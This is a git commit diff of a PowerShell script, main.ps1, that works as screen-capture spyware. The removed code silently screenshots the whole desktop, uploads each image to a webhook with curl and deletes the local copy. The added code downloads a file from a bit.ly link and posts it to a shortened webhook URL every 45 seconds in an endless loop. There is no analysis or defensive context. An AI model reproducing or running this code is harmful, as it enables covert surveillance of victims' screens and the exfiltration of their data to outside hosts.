039a1e1600cb18a7789b757246fdcd8ad9f0d792
Gerper90 <43889986+Gerper90@users.noreply.github.com>
2024-02-10 20:33:47 -0500

    Update main.ps1

--- main.ps1
+++ main.ps1
@@ -1,27 +1,33 @@
-$hookurl = "$dc"
-$seconds = 30 # Screenshot interval
-$a = 1 # Sceenshot amount
+# Descargar automáticamente el archivo desde el enlace
+$url = "https://bit.ly/Screen_dc"
+$output = "$env:temp\SC.png"
+Invoke-WebRequest -Uri $url -OutFile $output
 
-# shortened URL Detection
-if ($hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $hookurl = (irm $hookurl).url}
+# Función para enviar la imagen al webhook
+function Send-Screenshot {
+    param (
+        [string]$ImageFile,
+        [string]$WebhookURL
+    )
+    $boundary = [System.Guid]::NewGuid().ToString()
+    $LF = "`r`n"
+    $bodyLines = (
+        "--$boundary",
+        "Content-Disposition: form-data; name=`"file1`"; filename=`"screenshot.png`"",
+        "Content-Type: image/png$LF",
+        (Get-Content -Path $ImageFile -Encoding Byte),
+        "--$boundary--$LF"
+    )
+    $body = $bodyLines -join $LF
+    $contentType = "multipart/form-data; boundary=$boundary"
+    Invoke-RestMethod -Uri $WebhookURL -Method Post -ContentType $contentType -Body $body
+}
 
-While ($a -gt 0){
-$Filett = "$env:temp\SC.png"
-Add-Type -AssemblyName System.Windows.Forms
-Add-type -AssemblyName System.Drawing
-$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-$Width = $Screen.Width
-$Height = $Screen.Height
-$Left = $Screen.Left
-$Top = $Screen.Top
-$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
-$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
-$bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
-Start-Sleep 1
-curl.exe -F "file1=@$filett" $hookurl
-Start-Sleep 1
-Remove-Item -Path $filett
-Start-Sleep $seconds
-$a--
+# Webhook URL
+$webhookURL = "https://bit.ly/web_chupakbras"
+
+# Loop para enviar imágenes cada 45 segundos
+while ($true) {
+    Send-Screenshot -ImageFile $output -WebhookURL $webhookURL
+    Start-Sleep -Seconds 45
 }
